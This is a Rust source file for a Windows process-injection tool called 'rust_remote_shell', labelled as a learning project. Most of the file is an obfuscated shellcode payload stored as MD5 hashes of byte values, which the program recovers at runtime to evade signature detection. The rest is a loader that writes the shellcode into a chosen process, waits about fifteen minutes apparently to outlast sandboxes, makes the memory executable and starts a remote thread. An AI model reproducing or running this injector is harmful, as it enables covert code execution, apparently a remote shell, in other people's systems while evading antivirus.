use clap::{Arg, Command};
use windows::Win32::{
    Foundation::CloseHandle,
    System::{
        Diagnostics::Debug::WriteProcessMemory,
        Memory::{
            VirtualAllocEx, VirtualFree, VirtualProtectEx, MEM_COMMIT, MEM_RELEASE, MEM_RESERVE,
            PAGE_EXECUTE, PAGE_PROTECTION_FLAGS, PAGE_READWRITE,
        },
        Threading::{
            CreateRemoteThreadEx, OpenProcess, WaitForSingleObject, INFINITE, PROCESS_ALL_ACCESS,
            PROCESS_VM_OPERATION,
        },
    },
};
fn main() -> Result<(), Box<dyn std::error::Error>> {
    let app = Command::new("rust_remote_shell")
        .author("numonce")
        .about("A process injection tool for learning")
        .version("0.0.1")
        .arg(
            Arg::new("PID")
                .long("pid")
                .short('p')
                .help("PID of the Process to inject into.")
                .required(true),
        )
        .get_matches();
    let hashes = [
        "03c6b06952c750899bb03d998e631860",
        "32bb90e8976aab5298d5da10fe66f21d",
        "1afa34a7f984eeabdbb0a7d494132ee5",
        "74db120f0a8e5646ef5a30154e9f6deb",
        "335f5352088d7d9bf74191e006d8e24c",
        "be83ab3ecd0db773eb2dc1b0a17836a1",
        "58a2fc6ed39fd083f55d4182bf88826d",
        "cfcd208495d565ef66e7dff9f98764da",
        "cfcd208495d565ef66e7dff9f98764da",
        "cfcd208495d565ef66e7dff9f98764da",
        "fc490ca45c00b1249bbe3554a4fdf6fb",
        "43ec517d68b6edd3015b3edc9a11367b",
        "fc490ca45c00b1249bbe3554a4fdf6fb",
        "f033ab37c30201f73f142449d037028d",
        "9778d5d219c5080b9a6a17bef029331c",
        "43ec517d68b6edd3015b3edc9a11367b",
        "93db85ed909c13838ff95ccfa94cebd9",
        "32bb90e8976aab5298d5da10fe66f21d",
        "f457c545a9ded88f18ecee47145a72c0",
        "6f3ef77ac0e3619e98159e9b6febf557",
        "38b3eff8baf56627478ec76a704e9b52",
        "32bb90e8976aab5298d5da10fe66f21d",
        "e00da03b685a0dd18fb6a08af0923de0",
        "9778d5d219c5080b9a6a17bef029331c",
        "26657d5ff9020d2abefe558796b99584",
        "32bb90e8976aab5298d5da10fe66f21d",
        "e00da03b685a0dd18fb6a08af0923de0",
        "9778d5d219c5080b9a6a17bef029331c",
        "1ff1de774005f8da13f42943881c655f",
        "32bb90e8976aab5298d5da10fe66f21d",
        "e00da03b685a0dd18fb6a08af0923de0",
        "9778d5d219c5080b9a6a17bef029331c",
        "6364d3f0f495b6ab9dcf8d3b5c6e0b01",
        "32bb90e8976aab5298d5da10fe66f21d",
        "e00da03b685a0dd18fb6a08af0923de0",
        "5fd0b37cd7dbbb00f97ba6ce92bf5add",
        "f033ab37c30201f73f142449d037028d",
        "32bb90e8976aab5298d5da10fe66f21d",
        "9bf31c7ff062936a96d3c8bd1f8f2ff3",
        "cedebb6e872f539bef8c3f919874e9d7",
        "ad61ab143223efbc24c7d2583be69251",
        "ad61ab143223efbc24c7d2583be69251",
        "28dd2c7955ce926456240b2ff0100bde",
        "f457c545a9ded88f18ecee47145a72c0",
        "757b505cfd34c64c85ca5b5690ee5293",
        "32bb90e8976aab5298d5da10fe66f21d",
        "f457c545a9ded88f18ecee47145a72c0",
        "58a2fc6ed39fd083f55d4182bf88826d",
        "1ff8a7b5dc7a7d1f0ed65aaa29c04b1e",
        "072b030ba126b2f4b2374f342be9ed44",
        "e2ef524fbf3d9fe611d5a8e90fefdc9c",
        "c8ffe9a587b126f152ed3d89a146b445",
        "c81e728d9d4c2f636f067f89cc14862c",
        "f7177163c833dff4b38fc8d2872f1ec6",
        "6364d3f0f495b6ab9dcf8d3b5c6e0b01",
        "fc490ca45c00b1249bbe3554a4fdf6fb",
        "bd686fd640be98efaae0091fa301e613",
        "757b505cfd34c64c85ca5b5690ee5293",
        "c51ce410c124a10e0db5e4b97fc2af39",
        "fc490ca45c00b1249bbe3554a4fdf6fb",
        "c4ca4238a0b923820dcc509a6f75849b",
        "bd686fd640be98efaae0091fa301e613",
        "9cfdf10e8fc047a44b08ed031e1f0ed1",
        "539fd53b59e3bb12d203f45a912eeaf2",
        "9778d5d219c5080b9a6a17bef029331c",
        "fc490ca45c00b1249bbe3554a4fdf6fb",
        "43ec517d68b6edd3015b3edc9a11367b",
        "32bb90e8976aab5298d5da10fe66f21d",
        "e00da03b685a0dd18fb6a08af0923de0",
        "9778d5d219c5080b9a6a17bef029331c",
        "6364d3f0f495b6ab9dcf8d3b5c6e0b01",
        "e00da03b685a0dd18fb6a08af0923de0",
        "3295c76acbf4caaed33c36b1b5fc2cb1",
        "072b030ba126b2f4b2374f342be9ed44",
        "32bb90e8976aab5298d5da10fe66f21d",
        "c4ca4238a0b923820dcc509a6f75849b",
        "091d584fced301b442654dd8c23b3fc9",
        "e00da03b685a0dd18fb6a08af0923de0",
        "76dc611d6ebaafc66cc0879c71b5db5c",
        "42a0e188f5033bc65bf8d78622277c4e",
        "cfcd208495d565ef66e7dff9f98764da",
        "cfcd208495d565ef66e7dff9f98764da",
        "cfcd208495d565ef66e7dff9f98764da",
        "32bb90e8976aab5298d5da10fe66f21d",
        "9fc3d7152ba9336a670e36d0ed79bc43",
        "58a2fc6ed39fd083f55d4182bf88826d",
        "c45147dee729311ef5b5c3003946c48f",
        "6974ce5ac660610b44d9b9fed0ff9548",
        "32bb90e8976aab5298d5da10fe66f21d",
        "c4ca4238a0b923820dcc509a6f75849b",
        "091d584fced301b442654dd8c23b3fc9",
        "f033ab37c30201f73f142449d037028d",
        "e00da03b685a0dd18fb6a08af0923de0",
        "32bb90e8976aab5298d5da10fe66f21d",
        "1ff1de774005f8da13f42943881c655f",
        "a3f390d88e4c41f2747bfa2f1b5f87db",
        "e00da03b685a0dd18fb6a08af0923de0",
        "ea5d2f1c4608232e07d3aa3d998e5135",
        "6364d3f0f495b6ab9dcf8d3b5c6e0b01",
        "d2ddea18f00665ce8623e36bd4e3c7c5",
        "c4ca4238a0b923820dcc509a6f75849b",
        "091d584fced301b442654dd8c23b3fc9",
        "705f2172834666788607efbfca35afb3",
        "93db85ed909c13838ff95ccfa94cebd9",
        "32bb90e8976aab5298d5da10fe66f21d",
        "fe131d7f5a6b38b23cc967316c13dae2",
        "757b505cfd34c64c85ca5b5690ee5293",
        "fc490ca45c00b1249bbe3554a4fdf6fb",
        "e00da03b685a0dd18fb6a08af0923de0",
        "9a1158154dfa42caddbd0694a4e9bdc8",
        "42a0e188f5033bc65bf8d78622277c4e",
        "32bb90e8976aab5298d5da10fe66f21d",
        "c4ca4238a0b923820dcc509a6f75849b",
        "ca46c1b9512a7a8315fa3c5a946e8265",
        "28dd2c7955ce926456240b2ff0100bde",
        "f457c545a9ded88f18ecee47145a72c0",
        "757b505cfd34c64c85ca5b5690ee5293",
        "32bb90e8976aab5298d5da10fe66f21d",
        "f457c545a9ded88f18ecee47145a72c0",
        "58a2fc6ed39fd083f55d4182bf88826d",
        "1ff8a7b5dc7a7d1f0ed65aaa29c04b1e",
        "fc490ca45c00b1249bbe3554a4fdf6fb",
        "bd686fd640be98efaae0091fa301e613",
        "757b505cfd34c64c85ca5b5690ee5293",
        "c51ce410c124a10e0db5e4b97fc2af39",
        "fc490ca45c00b1249bbe3554a4fdf6fb",
        "c4ca4238a0b923820dcc509a6f75849b",
        "bd686fd640be98efaae0091fa301e613",
        "9f61408e3afb633e50cdf1b20de6f466",
        "13fe9d84310e77f13a6d184dbf1232f3",
        "eb160de1de89d9058fcb0b968dbbbd68",
        "f340f1b1f65b6df5b5e3f94d95b11daf",
        "fbd7939d674997cdb4692d34de8633c4",
        "eccbc87e4b5ce2fe28308fd9f2a7baf3",
        "fbd7939d674997cdb4692d34de8633c4",
        "19ca14e7ea6328a42e0eb13d585e4c22",
        "c9f0f895fb98ab9159f51fd0297e236d",
        "14bfa6bb14875e45bba028a21ed38046",
        "72b32a1f754ba1c09b3695e0cb6cde7f",
        "b1d10e7bafa4421218a51b1e1f1b0ba2",
        "eb160de1de89d9058fcb0b968dbbbd68",
        "45fbc6d3e05ebd93369ce542e8f2322d",
        "2a38a4a9316c49e5a833517c45d31070",
        "a3f390d88e4c41f2747bfa2f1b5f87db",
        "e00da03b685a0dd18fb6a08af0923de0",
        "ea5d2f1c4608232e07d3aa3d998e5135",
        "19ca14e7ea6328a42e0eb13d585e4c22",
        "d2ddea18f00665ce8623e36bd4e3c7c5",
        "c4ca4238a0b923820dcc509a6f75849b",
        "091d584fced301b442654dd8c23b3fc9",
        "ec8956637a99787bd197eacd77acce5e",
        "fc490ca45c00b1249bbe3554a4fdf6fb",
        "e00da03b685a0dd18fb6a08af0923de0",
        "c20ad4d76fe97759aa27a0c99bff6710",
        "32bb90e8976aab5298d5da10fe66f21d",
        "a3f390d88e4c41f2747bfa2f1b5f87db",
        "e00da03b685a0dd18fb6a08af0923de0",
        "ea5d2f1c4608232e07d3aa3d998e5135",
        "33e75ff09dd601bbe69f351039152189",
        "d2ddea18f00665ce8623e36bd4e3c7c5",
        "c4ca4238a0b923820dcc509a6f75849b",
        "091d584fced301b442654dd8c23b3fc9",
        "fc490ca45c00b1249bbe3554a4fdf6fb",
        "e00da03b685a0dd18fb6a08af0923de0",
        "a87ff679a2f3e71d9181a67b7542122c",
        "42a0e188f5033bc65bf8d78622277c4e",
        "32bb90e8976aab5298d5da10fe66f21d",
        "c4ca4238a0b923820dcc509a6f75849b",
        "091d584fced301b442654dd8c23b3fc9",
        "fc490ca45c00b1249bbe3554a4fdf6fb",
        "2a38a4a9316c49e5a833517c45d31070",
        "fc490ca45c00b1249bbe3554a4fdf6fb",
        "2a38a4a9316c49e5a833517c45d31070",
        "f4b9ec30ad9f68f89b29639786cb62ef",
        "7647966b7343c29048673252e490f736",
        "8613985ec49eb8f757ae6439e879bb2a",
        "fc490ca45c00b1249bbe3554a4fdf6fb",
        "2a38a4a9316c49e5a833517c45d31070",
        "fc490ca45c00b1249bbe3554a4fdf6fb",
        "7647966b7343c29048673252e490f736",
        "fc490ca45c00b1249bbe3554a4fdf6fb",
        "8613985ec49eb8f757ae6439e879bb2a",
        "32bb90e8976aab5298d5da10fe66f21d",
        "1afa34a7f984eeabdbb0a7d494132ee5",
        "01161aaa0b6d1345dd8fe4e481144d84",
        "6364d3f0f495b6ab9dcf8d3b5c6e0b01",
        "fc490ca45c00b1249bbe3554a4fdf6fb",
        "9778d5d219c5080b9a6a17bef029331c",
        "fe131d7f5a6b38b23cc967316c13dae2",
        "13fe9d84310e77f13a6d184dbf1232f3",
        "2a38a4a9316c49e5a833517c45d31070",
        "fc490ca45c00b1249bbe3554a4fdf6fb",
        "7647966b7343c29048673252e490f736",
        "8613985ec49eb8f757ae6439e879bb2a",
        "32bb90e8976aab5298d5da10fe66f21d",
        "e00da03b685a0dd18fb6a08af0923de0",
        "6f4922f45568161a8cdf4ad2299f6d23",
        "e165421110ba03099a1c0393373c5b43",
        "c7e1249ffc03eb9ded908c236bd1996d",
        "fe131d7f5a6b38b23cc967316c13dae2",
        "fe131d7f5a6b38b23cc967316c13dae2",
        "fe131d7f5a6b38b23cc967316c13dae2",
        "98dce83da57b0395e163467c9dae521b",
        "d2ddea18f00665ce8623e36bd4e3c7c5",
        "cfecdb276f634854f3ef915e2e980c31",
        "07e1cd7dca89a1678042477183b7ac3f",
        "2b44928ae11fb9384c4cf38708677c48",
        "c0c7c76d30bd3dcaefc96f40275bdc0a",
        "812b4ba287f5ee0bc9d43bbf5bbe87fb",
        "2838023a778dfaecdc212708f721b788",
        "c0c7c76d30bd3dcaefc96f40275bdc0a",
        "cfcd208495d565ef66e7dff9f98764da",
        "cfcd208495d565ef66e7dff9f98764da",
        "fc490ca45c00b1249bbe3554a4fdf6fb",
        "93db85ed909c13838ff95ccfa94cebd9",
        "d2ddea18f00665ce8623e36bd4e3c7c5",
        "3988c7f88ebcb58c6ce932b957b6f332",
        "6da9003b743b65f4c0ccd295cc484e57",
        "32bb90e8976aab5298d5da10fe66f21d",
        "d1f491a404d6854880943e5c3cd9ca25",
        "01161aaa0b6d1345dd8fe4e481144d84",
        "b73ce398c39f506af761d2277d853a92",
        "c4ca4238a0b923820dcc509a6f75849b",
        "cfcd208495d565ef66e7dff9f98764da",
        "cfcd208495d565ef66e7dff9f98764da",
        "d2ddea18f00665ce8623e36bd4e3c7c5",
        "3988c7f88ebcb58c6ce932b957b6f332",
        "57aeee35c98205091e18d1140e9f38cf",
        "d2ddea18f00665ce8623e36bd4e3c7c5",
        "9dcb88e0137649590b755372b040afad",
        "c81e728d9d4c2f636f067f89cc14862c",
        "cfcd208495d565ef66e7dff9f98764da",
        "c4ca4238a0b923820dcc509a6f75849b",
        "31fefc0e570cb3860f2a6d4b38c6490d",
        "58a2fc6ed39fd083f55d4182bf88826d",
        "006f52e9102a8d3be2fe5614f42ba989",
        "cfcd208495d565ef66e7dff9f98764da",
        "d645920e395fedad7bbbed0eca3fe2e0",
        "fc490ca45c00b1249bbe3554a4fdf6fb",
        "68d30a9594728bc39aa24be94b319d21",
        "d2ddea18f00665ce8623e36bd4e3c7c5",
        "3988c7f88ebcb58c6ce932b957b6f332",
        "74db120f0a8e5646ef5a30154e9f6deb",
        "fbd7939d674997cdb4692d34de8633c4",
        "3988c7f88ebcb58c6ce932b957b6f332",
        "f340f1b1f65b6df5b5e3f94d95b11daf",
        "fc490ca45c00b1249bbe3554a4fdf6fb",
        "9872ed9fc22fc182d371c3e9ed316094",
        "fbd7939d674997cdb4692d34de8633c4",
        "07e1cd7dca89a1678042477183b7ac3f",
        "a5771bce93e200c36f7cd9dfd0e5deaa",
        "8f14e45fceea167a5a36dedd4bea2543",
        "fe131d7f5a6b38b23cc967316c13dae2",
        "979d472a84804b9f647bc185a877a8b5",
        "fbd7939d674997cdb4692d34de8633c4",
        "3988c7f88ebcb58c6ce932b957b6f332",
        "289dff07669d7a23de0ef88d2f7129e7",
        "c9e1074f5b3f9fc8ea15d152add07294",
        "c4ca4238a0b923820dcc509a6f75849b",
        "c4ca4238a0b923820dcc509a6f75849b",
        "cfcd208495d565ef66e7dff9f98764da",
        "cfcd208495d565ef66e7dff9f98764da",
        "7647966b7343c29048673252e490f736",
        "fc490ca45c00b1249bbe3554a4fdf6fb",
        "9872ed9fc22fc182d371c3e9ed316094",
        "3416a75f4cea9109507cacd8e2f2aefc",
        "76dc611d6ebaafc66cc0879c71b5db5c",
        "a97da629b098b75c294dffdc3e463904",
        "cfcd208495d565ef66e7dff9f98764da",
        "fe131d7f5a6b38b23cc967316c13dae2",
        "979d472a84804b9f647bc185a877a8b5",
        "f033ab37c30201f73f142449d037028d",
        "f033ab37c30201f73f142449d037028d",
        "28dd2c7955ce926456240b2ff0100bde",
        "f457c545a9ded88f18ecee47145a72c0",
        "757b505cfd34c64c85ca5b5690ee5293",
        "28dd2c7955ce926456240b2ff0100bde",
        "f457c545a9ded88f18ecee47145a72c0",
        "58a2fc6ed39fd083f55d4182bf88826d",
        "32bb90e8976aab5298d5da10fe66f21d",
        "fe131d7f5a6b38b23cc967316c13dae2",
        "58a2fc6ed39fd083f55d4182bf88826d",
        "32bb90e8976aab5298d5da10fe66f21d",
        "3988c7f88ebcb58c6ce932b957b6f332",
        "a597e50502f5ff68e3e25b9114205d4a",
        "32bb90e8976aab5298d5da10fe66f21d",
        "fe131d7f5a6b38b23cc967316c13dae2",
        "58a2fc6ed39fd083f55d4182bf88826d",
        "32bb90e8976aab5298d5da10fe66f21d",
        "3988c7f88ebcb58c6ce932b957b6f332",
        "bd686fd640be98efaae0091fa301e613",
        "fc490ca45c00b1249bbe3554a4fdf6fb",
        "9872ed9fc22fc182d371c3e9ed316094",
        "289dff07669d7a23de0ef88d2f7129e7",
        "9bf31c7ff062936a96d3c8bd1f8f2ff3",
        "115f89503138416a242f40fb7d7f338e",
        "13fe9d84310e77f13a6d184dbf1232f3",
        "fe131d7f5a6b38b23cc967316c13dae2",
        "979d472a84804b9f647bc185a877a8b5",
        "32bb90e8976aab5298d5da10fe66f21d",
        "3988c7f88ebcb58c6ce932b957b6f332",
        "84d9ee44e457ddef7f2c4f25dc8fa865",
        "f0935e4cd5920aa6c7c996a5ee53a70f",
        "c74d97b01eae257e44aa9d5bade97baf",
        "fc490ca45c00b1249bbe3554a4fdf6fb",
        "2a38a4a9316c49e5a833517c45d31070",
        "fbd7939d674997cdb4692d34de8633c4",
        "3988c7f88ebcb58c6ce932b957b6f332",
        "9cfdf10e8fc047a44b08ed031e1f0ed1",
        "32bb90e8976aab5298d5da10fe66f21d",
        "3988c7f88ebcb58c6ce932b957b6f332",
        "077e29b11be80ab57e1a2ecabb7da330",
        "fc490ca45c00b1249bbe3554a4fdf6fb",
        "9872ed9fc22fc182d371c3e9ed316094",
        "b3e3e393c77e35a4a3f3cbd1e429b5dc",
        "9766527f2b5d3e95d4a733fcfb77bd7e",
        "c45147dee729311ef5b5c3003946c48f",
        "e2ef524fbf3d9fe611d5a8e90fefdc9c",
        "fe131d7f5a6b38b23cc967316c13dae2",
        "979d472a84804b9f647bc185a877a8b5",
        "32bb90e8976aab5298d5da10fe66f21d",
        "d1f491a404d6854880943e5c3cd9ca25",
        "084b6fbb10729ed4da8c3d3f5a3ae7c9",
        "ea5d2f1c4608232e07d3aa3d998e5135",
        "c81e728d9d4c2f636f067f89cc14862c",
        "cfcd208495d565ef66e7dff9f98764da",
        "cfcd208495d565ef66e7dff9f98764da",
        "d2ddea18f00665ce8623e36bd4e3c7c5",
        "6cdd60ea0045eb7a6ec44c54d29ed402",
        "ac627ab1ccbdb62ec96e702f07f6425b",
        "2723d092b63885e0d7c260cc007e8b9d",
        "f899139df5e1059396431415e770c6dd",
        "cfcd208495d565ef66e7dff9f98764da",
        "cfcd208495d565ef66e7dff9f98764da",
        "cfcd208495d565ef66e7dff9f98764da",
        "cfcd208495d565ef66e7dff9f98764da",
        "cfcd208495d565ef66e7dff9f98764da",
        "fc490ca45c00b1249bbe3554a4fdf6fb",
        "f033ab37c30201f73f142449d037028d",
        "fc490ca45c00b1249bbe3554a4fdf6fb",
        "f033ab37c30201f73f142449d037028d",
        "32bb90e8976aab5298d5da10fe66f21d",
        "3988c7f88ebcb58c6ce932b957b6f332",
        "9cfdf10e8fc047a44b08ed031e1f0ed1",
        "c7e1249ffc03eb9ded908c236bd1996d",
        "c7e1249ffc03eb9ded908c236bd1996d",
        "c7e1249ffc03eb9ded908c236bd1996d",
        "28dd2c7955ce926456240b2ff0100bde",
        "f457c545a9ded88f18ecee47145a72c0",
        "58a2fc6ed39fd083f55d4182bf88826d",
        "f0935e4cd5920aa6c7c996a5ee53a70f",
        "c51ce410c124a10e0db5e4b97fc2af39",
        "7647966b7343c29048673252e490f736",
        "fc490ca45c00b1249bbe3554a4fdf6fb",
        "f033ab37c30201f73f142449d037028d",
        "9cfdf10e8fc047a44b08ed031e1f0ed1",
        "03c6b06952c750899bb03d998e631860",
        "ec8956637a99787bd197eacd77acce5e",
        "84d9ee44e457ddef7f2c4f25dc8fa865",
        "a3f390d88e4c41f2747bfa2f1b5f87db",
        "19ca14e7ea6328a42e0eb13d585e4c22",
        "68d30a9594728bc39aa24be94b319d21",
        "c4ca4238a0b923820dcc509a6f75849b",
        "c4ca4238a0b923820dcc509a6f75849b",
        "32bb90e8976aab5298d5da10fe66f21d",
        "0f28b5d49b3020afeecd95b4009adf4c",
        "a3f390d88e4c41f2747bfa2f1b5f87db",
        "19ca14e7ea6328a42e0eb13d585e4c22",
        "1ff1de774005f8da13f42943881c655f",
        "0e65972dce68dad4d52d063967f0a705",
        "cfcd208495d565ef66e7dff9f98764da",
        "c9e1074f5b3f9fc8ea15d152add07294",
        "32bb90e8976aab5298d5da10fe66f21d",
        "3988c7f88ebcb58c6ce932b957b6f332",
        "6da9003b743b65f4c0ccd295cc484e57",
        "93db85ed909c13838ff95ccfa94cebd9",
        "f033ab37c30201f73f142449d037028d",
        "fc490ca45c00b1249bbe3554a4fdf6fb",
        "f033ab37c30201f73f142449d037028d",
        "fc490ca45c00b1249bbe3554a4fdf6fb",
        "f033ab37c30201f73f142449d037028d",
        "fc490ca45c00b1249bbe3554a4fdf6fb",
        "f033ab37c30201f73f142449d037028d",
        "d2ddea18f00665ce8623e36bd4e3c7c5",
        "fe131d7f5a6b38b23cc967316c13dae2",
        "58a2fc6ed39fd083f55d4182bf88826d",
        "fc490ca45c00b1249bbe3554a4fdf6fb",
        "f033ab37c30201f73f142449d037028d",
        "d2ddea18f00665ce8623e36bd4e3c7c5",
        "fe131d7f5a6b38b23cc967316c13dae2",
        "3644a684f98ea8fe223c713b77189a77",
        "28dd2c7955ce926456240b2ff0100bde",
        "3988c7f88ebcb58c6ce932b957b6f332",
        "bd686fd640be98efaae0091fa301e613",
        "fbd7939d674997cdb4692d34de8633c4",
        "3988c7f88ebcb58c6ce932b957b6f332",
        "bd686fd640be98efaae0091fa301e613",
        "fc490ca45c00b1249bbe3554a4fdf6fb",
        "9872ed9fc22fc182d371c3e9ed316094",
        "4c56ff4ce4aaf9573aa5dff913df997a",
        "274ad4786c3abca69fa097b85867d9a4",
        "03afdbd66e7929b125f8597834fa83a4",
        "02522a2b2726fb0a03bb19f2d8d9524d",
        "fe131d7f5a6b38b23cc967316c13dae2",
        "979d472a84804b9f647bc185a877a8b5",
        "32bb90e8976aab5298d5da10fe66f21d",
        "f457c545a9ded88f18ecee47145a72c0",
        "6f3ef77ac0e3619e98159e9b6febf557",
        "32bb90e8976aab5298d5da10fe66f21d",
        "fe131d7f5a6b38b23cc967316c13dae2",
        "854d6fae5ee42911677c739ee1734486",
        "e00da03b685a0dd18fb6a08af0923de0",
        "aab3238922bcc25a6f606eb525ffdc56",
        "fc490ca45c00b1249bbe3554a4fdf6fb",
        "9872ed9fc22fc182d371c3e9ed316094",
        "c9f0f895fb98ab9159f51fd0297e236d",
        "7f1de29e6da19d22b51c68001e7e0e54",
        "6ea9ab1baa0efb9e19094440c317e21b",
        "26657d5ff9020d2abefe558796b99584",
        "fe131d7f5a6b38b23cc967316c13dae2",
        "979d472a84804b9f647bc185a877a8b5",
        "31fefc0e570cb3860f2a6d4b38c6490d",
        "335f5352088d7d9bf74191e006d8e24c",
        "fc221309746013ac554571fbd180e1c8",
        "82aa4b0af34c2313a562076992e50aa3",
        "93db85ed909c13838ff95ccfa94cebd9",
        "fc490ca45c00b1249bbe3554a4fdf6fb",
        "9872ed9fc22fc182d371c3e9ed316094",
        "7e7757b1e12abcb736ab9a754ffb617a",
        "f2217062e9a397a1dca429e7d70bc6ca",
        "a2557a7b2e94197ff767970b67041697",
        "6c4b761a28b734fe93831e3fb400ce87",
        "fe131d7f5a6b38b23cc967316c13dae2",
        "979d472a84804b9f647bc185a877a8b5",
        "32bb90e8976aab5298d5da10fe66f21d",
        "1afa34a7f984eeabdbb0a7d494132ee5",
        "084b6fbb10729ed4da8c3d3f5a3ae7c9",
        "d645920e395fedad7bbbed0eca3fe2e0",
        "072b030ba126b2f4b2374f342be9ed44",
        "1679091c5a880faf6fb5e6087eb1b2dc",
        "c8ffe9a587b126f152ed3d89a146b445",
        "d3d9446802a44259755d38e6d163e820",
        "76dc611d6ebaafc66cc0879c71b5db5c",
        "19f3cd308f1455b3fa09a282e0d496f4",
        "13fe9d84310e77f13a6d184dbf1232f3",
        "eb160de1de89d9058fcb0b968dbbbd68",
        "e4da3b7fbbce2345d7772b0674a318d5",
        "31fefc0e570cb3860f2a6d4b38c6490d",
        "e2c420d928d4bf8ce0ff2ec19b371514",
        "1f0e3dad99908345f7439f8ffabdffc4",
        "5fd0b37cd7dbbb00f97ba6ce92bf5add",
        "698d51a19d8a121ce581499d7b701668",
        "f0935e4cd5920aa6c7c996a5ee53a70f",
        "cfcd208495d565ef66e7dff9f98764da",
        "7647966b7343c29048673252e490f736",
        "fc490ca45c00b1249bbe3554a4fdf6fb",
        "3988c7f88ebcb58c6ce932b957b6f332",
        "e96ed478dab8595a7dbda4cbcbee168f",
        "fe131d7f5a6b38b23cc967316c13dae2",
        "979d472a84804b9f647bc185a877a8b5",
    ];
    let mut buf: Vec<u8> = Vec::new();
    for hash in hashes {
        for i in 0..=255 {
            let computed_md5 = format!("{:x}", md5::compute(i.to_string()));
            if hash == computed_md5 {
                buf.push(i);
            }
        }
    }
    let mut old_flags = PAGE_PROTECTION_FLAGS(0);
    let pid_string = app.get_one::<String>("PID").unwrap();
    let pid: u32 = pid_string.parse()?;
    unsafe {
        println!("[+] Attempting to get handle on process {}...", &pid);
        let h_remote_process = OpenProcess(PROCESS_ALL_ACCESS | PROCESS_VM_OPERATION, false, pid)?;
        println!("[+] Allocating memory...");

        let p_buffer = VirtualAllocEx(
            h_remote_process,
            None,
            buf.len(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        );

        let mut return_len = 0;
        WriteProcessMemory(
            h_remote_process,
            p_buffer,
            buf.as_ptr() as _,
            buf.len(),
            Some(&mut return_len),
        )
        .unwrap_or_else(|e| {
            panic!("[!] WriteProcessMemory Failed With Error: {e}");
        });
        println!("Wrote {} bytes.", return_len);
        count_down(910);
        VirtualProtectEx(
            h_remote_process,
            p_buffer,
            buf.len(),
            PAGE_EXECUTE,
            &mut old_flags,
        )?;
        println!("changed protections");
        let h_remote_thread = CreateRemoteThreadEx(
            h_remote_process,
            None,
            0,
            std::mem::transmute(p_buffer),
            None,
            0,
            None,
            None,
        )?;
        WaitForSingleObject(h_remote_thread, INFINITE);
        println!("Cleaning...");
        CloseHandle(h_remote_thread)?;
        CloseHandle(h_remote_process)?;
        VirtualFree(p_buffer, 0, MEM_RELEASE)?;
    }
    Ok(())
}
fn count_down(count: i32) {
    for i in 1..=count {
        std::thread::sleep(std::time::Duration::from_secs(1));
        println!("about {} secs", (count - i));
    }
}
